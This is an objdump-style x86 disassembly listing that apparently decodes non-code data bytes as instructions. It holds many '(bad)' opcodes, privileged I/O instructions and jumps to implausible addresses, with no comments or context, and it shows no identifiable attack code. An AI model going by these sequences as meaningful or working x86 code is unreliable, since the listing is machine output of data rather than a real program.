  4296a1:	xor    edx,DWORD PTR [esi+0x4a]
  4296a4:	jo     0x42968a
  4296a6:	cwde   
  4296a7:	or     esp,DWORD PTR [esi-0x5d]
  4296aa:	jp     0x429646
  4296ac:	cmp    ebx,esi
  4296ae:	iret   
  4296af:	xchg   esp,eax
  4296b0:	inc    esi
  4296b1:	xor    BYTE PTR [eax],cl
  4296b3:	inc    edx
  4296b4:	pop    esp
  4296b5:	mov    ah,BYTE PTR [ecx+0x76]
  4296b8:	or     dh,BYTE PTR ds:0x169a384f
  4296be:	dec    esi
  4296bf:	call   0x92a863bc
  4296c4:	ret    
  4296c5:	cld    
  4296c6:	mov    dh,0x83
  4296c8:	aas    
  4296c9:	add    eax,0x7c22433f
  4296ce:	ins    DWORD PTR es:[edi],dx
  4296cf:	and    al,0x8d
  4296d1:	(bad)  
  4296d2:	data16 add BYTE PTR [eax-0xa],0x6c
  4296d7:	sbb    DWORD PTR [edx],esp
  4296d9:	pop    ebx
  4296da:	pop    edi
  4296db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4296dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4296dd:	mov    BYTE PTR [esi+0x78],bh
  4296e0:	lahf   
  4296e1:	pop    ss
  4296e2:	cwde   
  4296e3:	(bad)  
  4296e5:	and    DWORD PTR [esi+0x12],eax
  4296e8:	cmp    DWORD PTR [edi+ebx*2+0x7e],0xffffff8d
  4296ed:	xor    al,0xc6
  4296ef:	xchg   esi,eax
  4296f0:	(bad)  
  4296f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4296f2:	daa    
  4296f3:	fbstp  TBYTE PTR [ecx]
  4296f5:	or     DWORD PTR [ecx+0x24],esp
  4296f8:	xchg   BYTE PTR [esi-0x26],bl
  4296fb:	sub    bh,dh
  4296fd:	jge    0x4296d7
  4296ff:	lock inc ebx
  429701:	cld    
  429702:	jb     0x429763
  429704:	inc    esi
  429705:	test   cl,bl
  429707:	(bad)  
  429708:	jae    0x42969e
  42970a:	push   0xffffffb2
  42970c:	and    BYTE PTR [ecx+0x1746cd2b],al
  429712:	in     eax,0x86
  429714:	in     al,dx
  429715:	repz adc DWORD PTR [ecx+0x41],eax
  429719:	repz (bad) 
  42971b:	iret   
  42971c:	ins    DWORD PTR es:[edi],dx
  42971d:	adc    eax,0x2da3fa4b
  429722:	repz mov edx,0x2f2b77ed
  429728:	cli    
  429729:	outs   dx,DWORD PTR ds:[esi]
  42972a:	mov    al,BYTE PTR [esi+0x2e7f663a]
  429730:	pop    ebx
  429731:	shl    BYTE PTR [edi+0x17],0x2
  429735:	cmp    al,0x69
  429737:	retf   
  429738:	out    dx,al
  429739:	pop    es
  42973a:	fbld   TBYTE PTR [eax-0x58]
  42973d:	aam    0xe
  42973f:	clc    
  429740:	(bad)  
  429742:	ins    BYTE PTR es:[edi],dx
  429743:	enter  0xd936,0xd1
  429747:	push   ds
  429748:	pop    es
  429749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42974a:	jmp    0xdb3:0x81e85ca6
  429751:	mov    ds:0xf900a150,eax
  429756:	daa    
  429757:	sbb    dh,BYTE PTR [esi+0x3b93bf9d]
  42975d:	mov    ebp,0x317967ab
  429762:	xchg   ecx,eax
  429763:	call   0x808082ed
  429768:	cmp    BYTE PTR [esi+0x79],0xbe
  42976c:	test   DWORD PTR [esi-0x3b2ba8b5],edi
  429772:	xchg   esp,eax
  429773:	dec    ecx
  429774:	(bad)  
  429775:	outs   dx,BYTE PTR ds:[esi]
  429776:	push   esi
  429777:	sbb    al,dl
  429779:	repz inc ebx
  42977b:	ret    
  42977c:	or     al,0xb3
  42977e:	call   0xe775:0x34bff4fc
  429785:	mov    ds:0x1bb8b9d6,eax
  42978a:	or     eax,0x107227f0
  42978f:	mov    WORD PTR [eax],es
	...
  4297f1:	add    BYTE PTR [eax],al
  4297f3:	add    BYTE PTR [eax],dh
  4297f5:	inc    edx
  4297f6:	fbld   TBYTE PTR [edx-0x1]
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	xchg   ebx,eax
  429801:	jne    0x429817
  429803:	call   0x104:0x1bb74
  42980a:	add    BYTE PTR [eax],al
  42980c:	jmp    0xb93d8432
  429811:	xor    al,0x41
  429813:	loop   0x4297ec
  429815:	addr16 jno 0x429811
  429818:	les    ecx,FWORD PTR [edx-0xe]
  42981b:	adc    BYTE PTR gs:[ecx+eax*1+0x41],0x3
  429821:	jne    0x42981a
  429823:	xchg   DWORD PTR [edx-0x44757c50],ebp
  429829:	or     BYTE PTR [ebx-0x7e5c2985],cl
  42982f:	mov    al,ds:0xee43ea7c
  429834:	mov    cl,0x34
  429836:	adc    BYTE PTR [ebx],0x6a
  429839:	mov    esi,0x6524d23a
  42983e:	stc    
  42983f:	lock push 0x9
  429842:	mov    ds,WORD PTR [eax-0x38]
  429845:	ss and ah,dl
  429848:	jb     0x4298c9
  42984a:	mov    ch,0xe2
  42984c:	shr    DWORD PTR [edx+0x2e],cl
  42984f:	fs pop esi
  429851:	into   
  429852:	inc    edi
  429853:	mov    es,WORD PTR [edx+eax*8+0x35]
  429857:	ret    0x47f5
  42985a:	mov    ss,esi
  42985c:	ja     0x429826
  42985e:	jo     0x429836
  429860:	lahf   
  429861:	sub    al,0x5a
  429863:	xor    edx,DWORD PTR [edx-0x21]
  429866:	in     eax,dx
  429867:	(bad)  
  429868:	mov    eax,0x5867ffab
  42986d:	addr16 jno 0x429812
  429870:	push   0xffffff91
  429872:	mov    edx,0x3ae31ab9
  429877:	popf   
  429878:	in     al,0x63
  42987a:	lods   eax,DWORD PTR ds:[esi]
  42987b:	sbb    BYTE PTR [ecx-0x1c13743],bh
  429881:	push   ebx
  429882:	sbb    cl,al
  429884:	jle    0x429816
  429886:	add    BYTE PTR [ebp+0x37eeb59e],bl
  42988c:	ror    DWORD PTR ds:0x87975418,1
  429892:	rcr    al,0x6c
  429895:	mov    al,ds:0x6ea84ff4
  42989a:	push   ebx
  42989b:	adc    eax,ecx
  42989d:	stos   DWORD PTR es:[edi],eax
  42989e:	scas   eax,DWORD PTR es:[edi]
  42989f:	outs   dx,DWORD PTR ds:[esi]
  4298a0:	mov    edx,0x99fbed8f
  4298a5:	inc    ebp
  4298a6:	fimul  DWORD PTR [esi*2-0x2f6d76ba]
  4298ad:	sbb    eax,0x657b3d2d
  4298b2:	jbe    0x429913
  4298b4:	jo     0x429875
  4298b6:	mov    DWORD PTR [esi+0x2fb0c2be],eax
  4298bc:	js     0x42987a
  4298be:	aaa    
  4298bf:	mov    ds:0x12ef65d9,al
  4298c4:	xor    edi,ebp
  4298c6:	(bad)  
  4298c7:	jmp    FWORD PTR [edi+0x2fcd4d6a]
  4298cd:	xor    BYTE PTR [ecx-0x3d],bl
  4298d0:	xor    DWORD PTR [esi],0x209861d
  4298d6:	jmp    0x429890
  4298d8:	daa    
  4298d9:	rol    DWORD PTR [esp+eax*8+0x36],cl
  4298dd:	mov    ebx,0xaf2bddf7
  4298e2:	cdq    
  4298e3:	jl     0x429865
  4298e5:	sub    bh,BYTE PTR [ebx-0x4d]
  4298e8:	mov    al,0xe9
  4298ea:	xlat   BYTE PTR cs:[ebx]
  4298ec:	lds    esp,FWORD PTR [edx+ebp*2-0x28]
  4298f0:	pop    ss
  4298f1:	mov    bl,0x5f
  4298f3:	adc    ebp,DWORD PTR [edx]
  4298f5:	shr    cl,0xe8
  4298f8:	ret    
  4298f9:	sub    dl,BYTE PTR [ecx-0x281eb6b6]
  4298ff:	jb     0x4298b7
  429901:	and    BYTE PTR [edi-0x24],al
  429904:	popa   
  429905:	mov    esp,0x1f67e34e
  42990a:	aad    0x58
  42990c:	bswap  esi
  42990e:	push   edi
  42990f:	sldt   WORD PTR [eax]
	...
  429972:	add    BYTE PTR [eax],al
  429974:	push   edi
  429975:	push   0xdf7fdf64
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	repnz in eax,dx
  429982:	xchg   edi,eax
  429983:	test   BYTE PTR [eax-0x44],bh
  429986:	add    DWORD PTR [eax],eax
  429988:	add    al,0x1
  42998a:	add    BYTE PTR [eax],al
  42998c:	adc    ebx,esp
  42998e:	jnp    0x42995c
  429990:	dec    ebx
  429991:	adc    DWORD PTR [esi+esi*1+0x41],edx
  429995:	push   edi
  429996:	cmc    
  429997:	bound  esp,QWORD PTR [edi+0x5c2a206d]
  42999d:	ret    
  42999e:	clc    
  42999f:	and    BYTE PTR [ebx+0x67e3904c],cl
  4299a5:	and    ch,BYTE PTR [ecx-0x79]
  4299a8:	test   eax,0xc6edf685
  4299ad:	clc    
  4299ae:	aam    0x63
  4299b0:	jl     0x429985
  4299b2:	pop    edx
  4299b3:	add    al,0x5
  4299b5:	into   
  4299b6:	bound  edi,QWORD PTR [ebx-0x43]
  4299b9:	dec    ecx
  4299ba:	mov    WORD PTR [edx+0x70],cs
  4299bd:	inc    eax
  4299be:	pop    ecx
  4299bf:	call   0x262c:0x281f4dca
  4299c6:	loopne 0x42994a
  4299c8:	stos   BYTE PTR es:[edi],al
  4299c9:	xchg   ebx,eax
  4299ca:	call   0xd8eb:0xc317e3c7
  4299d1:	sahf   
  4299d2:	call   0x435a:0x16365c4f
  4299d9:	jno    0x429a32
  4299db:	aam    0x32
  4299dd:	or     DWORD PTR [ecx],esi
  4299df:	popa   
  4299e0:	jb     0x429a4f
  4299e2:	push   ss
  4299e3:	ds sbb al,0xdd
  4299e6:	adc    esp,DWORD PTR [ebp+0x3b]
  4299e9:	push   edi
  4299ea:	pop    ebp
  4299eb:	mov    bh,BYTE PTR [edx-0x2976c48a]
  4299f1:	bnd jle 0x429a17
  4299f4:	scas   eax,DWORD PTR es:[edi]
  4299f5:	loope  0x429a3f
  4299f7:	push   ds
  4299f8:	les    esp,FWORD PTR [edx+0x5f]
  4299fb:	stos   DWORD PTR es:[edi],eax
  4299fc:	or     esp,0xffffff81
  4299ff:	push   ss
  429a00:	mov    edi,0xd93db5e2
  429a05:	xor    bh,al
  429a07:	scas   eax,DWORD PTR es:[edi]
  429a08:	xor    bl,cl
  429a0a:	mov    DWORD PTR [esi],ebp
  429a0c:	push   ss
  429a0d:	inc    ebx
  429a0e:	sbb    al,0xd2
  429a10:	lock adc DWORD PTR [esi-0x47610114],0xfffffff4
  429a18:	push   ecx
  429a19:	and    al,0x69
  429a1b:	or     DWORD PTR [ecx+0x2d],edi
  429a1e:	aam    0xd2
  429a20:	data16 int3 
  429a22:	dec    ebx
  429a23:	jp     0x4299f5
  429a25:	add    eax,0x1dd14381
  429a2a:	scas   al,BYTE PTR es:[edi]
  429a2b:	jnp    0x429a28
  429a2d:	in     eax,dx
  429a2e:	sub    al,0x6a
  429a30:	push   edi
  429a31:	xchg   ecx,eax
  429a32:	sub    ecx,esp
  429a34:	fldcw  WORD PTR [ebp+0x64]
  429a37:	(bad)  
  429a38:	jge    0x429a66
  429a3a:	fstp   QWORD PTR [edi-0x61]
  429a3d:	add    dh,ch
  429a3f:	pop    ecx
  429a40:	fadd   DWORD PTR [esi-0x24f1aa51]
  429a46:	shr    DWORD PTR [ecx+0x1e925d88],1
  429a4c:	outs   dx,BYTE PTR ds:[esi]
  429a4d:	push   es
  429a4e:	push   ds
  429a4f:	mov    cl,0xe2
  429a51:	or     DWORD PTR [edx+0x15],esi
  429a54:	gs mov ah,0x9a
  429a57:	enter  0xb29f,0xa2
  429a5b:	pop    ebx
  429a5c:	lock push ebp
  429a5e:	cwde   
  429a5f:	jg     0x429a99
  429a61:	in     eax,0xbb
  429a63:	cmp    DWORD PTR ds:0xed15aca3,ebx
  429a69:	push   ebp
  429a6a:	es mov bl,dh
  429a6d:	mov    ah,0x69
  429a6f:	jmp    0x8afb:0x39989514
  429a76:	icebp  
  429a77:	dec    edi
  429a78:	scas   al,BYTE PTR es:[edi]
  429a79:	sub    al,BYTE PTR [edx]
  429a7b:	xchg   ebp,eax
  429a7c:	sbb    eax,0x88270d37
  429a81:	(bad)  
  429a82:	jmp    DWORD PTR [eax+0xeb051b7]
  429a88:	mov    DWORD PTR [edi],edi
  429a8a:	test   bh,0x4
  429a8d:	stc    
  429a8e:	call   0x0:0x97
	...
  429af1:	add    BYTE PTR [eax],al
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0xf5a95667
  429b01:	sub    BYTE PTR [edi+0x74],cl
  429b04:	jl     0x429ac3
  429b06:	add    DWORD PTR [eax],eax
  429b08:	add    al,0x1
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	jnp    0x429a93
  429b0e:	cli    
  429b0f:	mov    eax,DWORD PTR [ecx]
  429b11:	push   edi
  429b12:	cwde   
  429b13:	clc    
  429b14:	push   edx
  429b15:	xor    edx,DWORD PTR [ebp+0x52a6780c]
  429b1b:	es (bad) 
  429b1d:	(bad)  
  429b1e:	sbb    al,BYTE PTR [ebx-0x7f]
  429b21:	shr    DWORD PTR [ebx],1
  429b23:	mov    es,ebp
  429b25:	jbe    0x429b55
  429b27:	xor    dl,dh
  429b29:	sub    eax,0x57c036e2
  429b2e:	add    al,0x0
  429b30:	imul   edx,DWORD PTR [edi+esi*8],0xb2c88b23
  429b37:	ret    0x9b0d
  429b3a:	popf   
  429b3b:	adc    ch,BYTE PTR [edi+eax*4]
  429b3e:	clc    
  429b3f:	xchg   esi,eax
  429b40:	dec    ebx
  429b41:	mov    ebx,0x1b9df61
  429b46:	enter  0x3838,0xc2
  429b4a:	rcr    DWORD PTR [ecx],0x88
  429b4d:	cmc    
  429b4e:	or     ebx,DWORD PTR [ebx]
  429b50:	adc    al,0x4e
  429b52:	jne    0x429ae5
  429b54:	jae    0x429b28
  429b56:	icebp  
  429b57:	repz ret 0x50f4
  429b5b:	lea    ebp,[ebp+0x32e21103]
  429b61:	fist   WORD PTR [edx+0x11]
  429b64:	mov    cl,0xc
  429b66:	pop    esi
  429b67:	mov    bh,0x84
  429b69:	sar    esi,cl
  429b6b:	push   edi
  429b6c:	cmp    BYTE PTR [edi-0xb38de5b],0x5f
  429b73:	xchg   ebp,eax
  429b74:	in     al,0x41
  429b76:	dec    edi
  429b77:	xor    al,0xc2
  429b79:	inc    ebx
  429b7a:	loop   0x429b84
  429b7c:	lods   al,BYTE PTR ds:[esi]
  429b7d:	mov    esi,DWORD PTR [edx+edi*4-0x1c]
  429b81:	jbe    0x429b05
  429b83:	shl    DWORD PTR [edx],1
  429b85:	fnsave [ecx]
  429b87:	adc    DWORD PTR [edx+0x2b778f2e],0x686a6300
  429b91:	inc    eax
  429b92:	addr16 (bad) 
  429b94:	xor    al,0xaf
  429b96:	fst    QWORD PTR [edi]
  429b98:	shl    ah,0xa2
  429b9b:	xor    al,0xa1
  429b9d:	cs nop
  429b9f:	stos   BYTE PTR es:[edi],al
  429ba0:	push   ebx
  429ba1:	sub    eax,0x8f247b3
  429ba6:	inc    ebp
  429ba7:	cli    
  429ba8:	shl    DWORD PTR [ebx+0x5c],0x40
  429bac:	mov    ebp,0xf38e0aee
  429bb1:	ins    DWORD PTR es:[edi],dx
  429bb2:	pop    edi
  429bb3:	stos   BYTE PTR es:[edi],al
  429bb4:	push   ecx
  429bb5:	mov    ds:0xde0eaca4,eax
  429bba:	dec    ebx
  429bbb:	loope  0x429bda
  429bbd:	(bad)  
  429bbe:	stos   BYTE PTR es:[edi],al
  429bbf:	imul   ebp,DWORD PTR [edi-0x72],0xccafc729
  429bc6:	scas   eax,DWORD PTR es:[edi]
  429bc7:	adc    edi,DWORD PTR [eax+0x26cfc1e3]
  429bcd:	push   0x2c
  429bcf:	jno    0x429c50
  429bd1:	test   ch,cl
  429bd3:	add    dl,BYTE PTR [esi]
  429bd5:	arpl   WORD PTR [ebp+eax*1+0x1dfd6b34],ax
  429bdc:	aaa    
  429bdd:	call   0xf81e:0x9b439f83
  429be4:	test   al,0xd8
  429be6:	out    0x20,al
  429be8:	loopne 0x429bd6
  429bea:	inc    ebx
  429beb:	(bad)  
  429bed:	push   cs
  429bee:	xor    DWORD PTR [eax-0x55],eax
  429bf1:	jns    0x429bad
  429bf3:	in     al,0x93
  429bf5:	daa    
  429bf6:	nop
  429bf7:	mov    esi,DWORD PTR [edx]
  429bf9:	cmp    BYTE PTR [edx],bh
  429bfb:	sub    bh,BYTE PTR [ebx]
  429bfd:	pushf  
  429bfe:	pop    ecx
  429bff:	or     edx,DWORD PTR [edi+0x5b40fd1]
  429c05:	(bad)  
  429c06:	loopne 0x429bce
  429c08:	out    dx,al
  429c09:	pop    esp
  429c0a:	or     DWORD PTR [ebp-0x75],edx
  429c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c0e:	stc    
  429c0f:	jecxz  0x429c11
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [ecx-0x7f27299c],cl
  429c85:	mov    esi,0x1040001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	(bad)  
  429c8d:	mov    al,ds:0xc64cd8b4
  429c92:	mov    dh,BYTE PTR [esi-0xe]
  429c95:	mov    dl,0x13
  429c97:	mov    ch,0xe2
  429c99:	mov    ds:0xb52c8f5c,al
  429c9e:	fnsave [ebp-0x1ac68d00]
  429ca4:	mov    ebx,0xe3de7754
  429ca9:	sub    bh,BYTE PTR [ecx]
  429cab:	imul   eax,esp,0x10
  429cae:	(bad)  
  429caf:	mov    ds:0xc11eb13b,al
  429cb4:	jge    0x429c96
  429cb6:	adc    esp,DWORD PTR [ecx+eax*8+0x5346b32d]
  429cbd:	sbb    al,0x44
  429cbf:	inc    edi
  429cc0:	xchg   edx,eax
  429cc1:	cmp    esp,ecx
  429cc3:	push   esp
  429cc4:	push   ebx
  429cc5:	cli    
  429cc6:	pop    ebx
  429cc7:	and    edi,esp
  429cc9:	adc    al,0xb2
  429ccb:	xchg   DWORD PTR [edx],esi
  429ccd:	stc    
  429cce:	cdq    
  429ccf:	dec    esi
  429cd0:	shl    DWORD PTR [ecx+eax*4+0x7],1
  429cd4:	xchg   edi,eax
  429cd5:	jge    0x429d20
  429cd7:	call   0x2d28:0x7a960637
  429cde:	jl     0x429cd4
  429ce0:	pop    es
  429ce1:	mov    WORD PTR [edx],ds
  429ce3:	cmp    ecx,ebp
  429ce5:	mov    cl,0xe1
  429ce7:	addr16 loope 0x429c9e
  429cea:	xlat   BYTE PTR ds:[ebx]
  429ceb:	xchg   edx,eax
  429cec:	test   BYTE PTR [ebp-0x3723a968],0x9a
  429cf3:	test   BYTE PTR [ebx-0x228ffa50],dh
  429cf9:	push   esp
  429cfa:	mov    ebp,0xcb331d89
  429cff:	test   BYTE PTR [esi+0x6],bl
  429d02:	adc    al,0x43
  429d04:	loope  0x429d5d
  429d06:	sbb    dh,BYTE PTR [ecx]
  429d08:	mov    al,ds:0x2dcf4759
  429d0d:	shl    edi,0xe6
  429d10:	mov    ebp,0x9b966782
  429d15:	mov    al,0xa5
  429d17:	pop    eax
  429d18:	jmp    0xc5363c8
  429d1d:	das    
  429d1e:	push   cs
  429d1f:	sbb    eax,0x35c0c7aa
  429d24:	dec    ecx
  429d25:	xor    BYTE PTR [ebx],cl
  429d27:	adc    eax,DWORD PTR [eax+ebp*1+0x3b5823c2]
  429d2e:	sub    cl,BYTE PTR [ebp+0x47]
  429d31:	xor    al,0x3b
  429d33:	xor    al,BYTE PTR [ecx+eiz*8-0x64]
  429d37:	sbb    BYTE PTR [edx+0xc],0x39
  429d3b:	retf   0x51c0
  429d3e:	xlat   BYTE PTR ds:[ebx]
  429d3f:	dec    edx
  429d40:	mov    al,ds:0xf7064422
  429d45:	(bad)  
  429d47:	adc    DWORD PTR [edi],edx
  429d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d4a:	jb     0x429d4f
  429d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d4d:	mov    edx,ebx
  429d4f:	iret   
  429d50:	es adc ch,0x3d
  429d54:	fld    DWORD PTR [ebx+0x25]
  429d57:	mov    ebx,0xc7e6ec56
  429d5c:	ja     0x429dbd
  429d5e:	mov    al,ds:0xe0221102
  429d63:	adc    al,0x36
  429d65:	popa   
  429d66:	loop   0x429d1f
  429d68:	cmp    esp,edi
  429d6a:	dec    esp
  429d6b:	inc    ebx
  429d6c:	or     BYTE PTR [ebx+0x72a60391],bh
  429d72:	fdivrp st(2),st
  429d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d75:	add    BYTE PTR [ecx-0x72],ah
  429d78:	mov    edi,0x5a0b5d8c
  429d7d:	adc    cl,ch
  429d7f:	mov    ah,0x30
  429d81:	arpl   WORD PTR [ebx],dx
  429d83:	cmc    
  429d84:	shr    DWORD PTR [edi],0x25
  429d87:	pop    edi
  429d88:	and    ecx,DWORD PTR [eax+0x7]
  429d8b:	es jl  0x429d45
  429d8e:	pop    esp
  429d8f:	mov    edi,0x0
	...
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	adc    esi,DWORD PTR [edx-0xc]
  429e03:	adc    al,0x84
  429e05:	mov    edi,0x1040001
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	sbb    BYTE PTR [ebp+ebp*4-0x7274d9],cl
  429e13:	lock jmp 0x9f2ed9a1
  429e19:	(bad)  
  429e1a:	les    esi,FWORD PTR [ebp-0x417f7cc0]
  429e20:	push   ss
  429e21:	iret   
  429e22:	enter  0x6d1e,0x6a
  429e26:	xchg   ecx,eax
  429e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e28:	pop    es
  429e29:	sub    esi,esi
  429e2b:	and    dh,BYTE PTR [ebx+0x4e]
  429e2e:	outs   dx,BYTE PTR ds:[esi]
  429e2f:	xor    edx,DWORD PTR [ebx-0x76]
  429e32:	mov    edx,0x6b81fdf7
  429e37:	pop    esi
  429e38:	cmp    eax,0xa3a23cb0
  429e3d:	out    dx,eax
  429e3e:	jecxz  0x429e77
  429e40:	stos   BYTE PTR es:[edi],al
  429e41:	cmp    ecx,edx
  429e43:	push   eax
  429e44:	mov    dh,0xa4
  429e46:	pushf  
  429e47:	lea    ecx,ds:0x3253637f
  429e4d:	dec    ebp
  429e4e:	lea    esp,[edx]
  429e50:	js     0x429e85
  429e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e53:	add    al,0x77
  429e55:	mov    dh,BYTE PTR [ebp+0x459d16b4]
  429e5b:	sbb    eax,0xabb00511
  429e60:	call   0x50754fcd
  429e65:	mov    BYTE PTR [ebx+0x83fa7c],dl
  429e6b:	jbe    0x429e26
  429e6d:	and    esp,ebp
  429e6f:	push   0x2
  429e71:	jp     0x429eed
  429e73:	mov    ebx,0xd02ba942
  429e78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e79:	mov    ds:0x22bdf614,eax
  429e7e:	icebp  
  429e7f:	sbb    dl,BYTE PTR [edx-0x3f7343fd]
  429e85:	test   DWORD PTR [ebp-0x6a],edx
  429e88:	add    BYTE PTR [ecx-0xb],cl
  429e8b:	iret   
  429e8c:	gs in  al,0x18
  429e8f:	xchg   esp,eax
  429e90:	enter  0xfd09,0x70
  429e94:	add    al,0xca
  429e96:	clc    
  429e97:	inc    ebx
  429e98:	mov    fs,esi
  429e9a:	add    BYTE PTR [ebp+0x2de68abe],bh
  429ea0:	icebp  
  429ea1:	adc    esp,DWORD PTR [esi]
  429ea3:	or     eax,0xc083391f
  429ea8:	sub    BYTE PTR [edi+0x33],ch
  429eab:	mov    DWORD PTR [ebx],esp
  429ead:	push   ebx
  429eae:	xor    al,0xcb
  429eb0:	ds push cs
  429eb2:	(bad)  
  429eb3:	jb     0x429ea5
  429eb5:	jnp    0x429ea4
  429eb7:	lods   al,BYTE PTR ds:[esi]
  429eb8:	rcl    dh,0xe2
  429ebb:	test   al,0xfb
  429ebd:	ror    DWORD PTR [eax-0x638d427f],cl
  429ec3:	or     dh,BYTE PTR [edx+eiz*8-0x548738e2]
  429eca:	repnz mov edx,0xb6ed53d2
  429ed0:	int3   
  429ed1:	gs hlt 
  429ed3:	inc    esp
  429ed4:	cli    
  429ed5:	(bad)  
  429ed6:	test   al,0xcf
  429ed8:	and    ah,BYTE PTR [esi+0x26]
  429edb:	push   edx
  429edc:	fcom   QWORD PTR [ecx]
  429ede:	adc    bl,BYTE PTR [ecx-0x627cec49]
  429ee4:	scas   eax,DWORD PTR es:[edi]
  429ee5:	xchg   ebp,eax
  429ee6:	sub    al,0xe1
  429ee8:	repnz dec ecx
  429eea:	jno    0x429f45
  429eec:	jl     0x429e95
  429eee:	jne    0x429f4a
  429ef0:	or     al,0xa5
  429ef2:	fxch   st(2)
  429ef4:	aad    0x1e
  429ef6:	add    DWORD PTR [ebp-0x60],edx
  429ef9:	mov    eax,0x7c4c2f1e
  429efe:	sub    ebx,DWORD PTR [esi+0xabbb958]
  429f04:	push   es
  429f05:	mov    al,ds:0xe902bb62
  429f0a:	arpl   WORD PTR [ebx+0x2cdc1ef6],dx
	...
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x1735ffd8]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	pushf  
  429f8d:	mov    cl,0xf7
  429f8f:	nop
  429f90:	cld    
  429f91:	iret   
  429f92:	outs   dx,DWORD PTR ds:[esi]
  429f93:	(bad)  
  429f94:	into   
  429f95:	push   cs
  429f96:	xor    DWORD PTR [ecx],esi
  429f98:	xor    eax,0x19ea1ceb
  429f9d:	repz cdq 
  429f9f:	mov    ds:0xbbc91a9c,eax
  429fa4:	push   ebx
  429fa5:	mov    ah,0xec
  429fa7:	xchg   esp,eax
  429fa8:	mov    al,ds:0xef9e4a06
  429fad:	popa   
  429fae:	loop   0x429fbe
  429fb0:	add    al,0x2
  429fb2:	ins    DWORD PTR es:[edi],dx
  429fb3:	pop    ebp
  429fb4:	adc    DWORD PTR [eax+ecx*1],0x6a
  429fb8:	mov    cl,0x6f
  429fba:	ja     0x429fb7
  429fbc:	fiadd  WORD PTR [ebx*8-0x3254e658]
  429fc3:	push   0xffffffc7
  429fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429fc6:	pop    esp
  429fc7:	mov    eax,0x800b7966
  429fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429fcd:	scas   eax,DWORD PTR es:[edi]
  429fce:	add    DWORD PTR [ebx-0x3c],esi
  429fd1:	jl     0x429fd9
  429fd3:	lods   al,BYTE PTR ds:[esi]
  429fd4:	xor    bl,ah
  429fd6:	cdq    
  429fd7:	outs   dx,BYTE PTR ds:[esi]
  429fd8:	jg     0x42a041
  429fda:	cmp    DWORD PTR [ecx+0x8],esi
  429fdd:	fsubrp st(3),st
  429fdf:	(bad)  
  429fe0:	xlat   BYTE PTR ds:[ebx]
  429fe1:	in     eax,dx
  429fe2:	mov    fs:0x7022b8a0,al
  429fe8:	push   0xffffffd7
  429fea:	rcl    BYTE PTR [ebx+0x39],cl
  429fed:	xchg   ebx,eax
  429fee:	addr16 mov ecx,0xe6a7dd92
  429ff4:	xchg   DWORD PTR [ecx+0x42e5de12],ebx
  429ffa:	enter  0x5ce5,0x20
  429ffe:	aaa    
  429fff:	idiv   BYTE PTR ds:0xebd8662f
  42a005:	xor    BYTE PTR [esp+ebx*4-0x688213c0],bl
  42a00c:	inc    ebp
  42a00d:	xchg   ebp,eax
  42a00e:	adc    al,0x6f
  42a010:	mov    ebp,0xefbad0bd
  42a015:	enter  0x9310,0x10
  42a019:	(bad)  
  42a01b:	xor    eax,DWORD PTR [ebx+eiz*2]
  42a01e:	dec    edx
  42a01f:	pop    ebx
  42a020:	mov    ch,0x4b
  42a022:	jmp    0x429ff8
  42a024:	arpl   WORD PTR [edi+ebx*1+0x6],dx
  42a028:	and    al,0xf1
  42a02a:	sub    eax,0x73f719fc
  42a02f:	sar    dl,cl
  42a031:	mov    edx,0xe97b4547
  42a036:	mov    cl,0xf7
  42a038:	sbb    bl,bh
  42a03a:	dec    esi
  42a03b:	popf   
  42a03c:	or     ah,BYTE PTR [edx+eiz*4]
  42a03f:	inc    ecx
  42a040:	mov    eax,ds:0x864d5966
  42a045:	imul   esi
  42a047:	shr    DWORD PTR [ebp-0x7719dfdf],0x56
  42a04e:	outs   dx,DWORD PTR ds:[esi]
  42a04f:	imul   ecx,DWORD PTR [edi+eax*2+0x59],0x927417de
  42a057:	out    0x8,eax
  42a059:	xchg   edx,eax
  42a05a:	es lock test bl,bh
  42a05e:	jmp    0x505f9abe
  42a063:	(bad)  
  42a064:	and    eax,0x1d31db29
  42a069:	jae    0x42a043
  42a06b:	call   0x7072:0x1f062f6c
  42a072:	imul   ebx,DWORD PTR [esi-0x191029fd],0xfd580f86
  42a07c:	xor    bl,BYTE PTR [edi-0x523d0166]
  42a082:	push   ebp
  42a083:	dec    ebx
  42a084:	out    dx,eax
  42a085:	dec    esi
  42a086:	add    bh,ch
  42a088:	and    dh,BYTE PTR [ecx-0x1a6b6c0]
  42a08e:	ja     0x42a0b0
	...
